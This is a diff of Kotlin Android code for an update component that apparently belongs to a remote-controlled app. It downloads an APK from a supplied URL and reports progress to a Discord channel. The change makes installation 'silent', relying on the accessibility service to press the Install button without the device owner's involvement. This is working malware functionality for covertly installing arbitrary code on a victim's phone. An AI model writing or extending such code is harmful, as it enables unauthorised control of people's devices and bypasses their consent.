@@ -24,10 +24,12 @@ object UpdateManager {
     private const val KEY_HASH = "pending_hash"
     private const val KEY_STATUS = "update_status"
 
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(60, TimeUnit.SECONDS)
+    private val downloadClient = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(120, TimeUnit.SECONDS)
-        .writeTimeout(60, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .followRedirects(true)
+        .followSslRedirects(true)
         .build()
 
     enum class Status {
@@ -90,7 +92,7 @@ object UpdateManager {
                 discord.sendMsg(":arrow_down: **Downloading update**...")
 
                 val request = Request.Builder().url(url).build()
-                val response = client.newCall(request).execute()
+                val response = downloadClient.newCall(request).execute()
 
                 if (!response.isSuccessful) {
                     response.close()
@@ -155,7 +157,7 @@ object UpdateManager {
             }
 
             setStatus(ctx, Status.INSTALLING)
-            discord?.sendMsg(":package: **Installing update**...")
+            discord?.sendMsg(":package: **Installing update silently**...")
 
             val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 FileProvider.getUriForFile(
@@ -172,8 +174,11 @@ object UpdateManager {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
             }
 
-            ctx.startActivity(intent)
-            discord?.sendMsg(":hourglass: **Install dialog opened**. Use accessibility to auto-click Install.")
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                ctx.startActivity(intent)
+            }, 500)
+
+            discord?.sendMsg(":hourglass: **Auto-installing**... (accessibility will click Install)")
         } catch (e: Exception) {
             setStatus(ctx, Status.FAILED)
             discord?.sendMsg(":x: **Install failed**: ${e.message?.take(80) ?: "unknown"}")
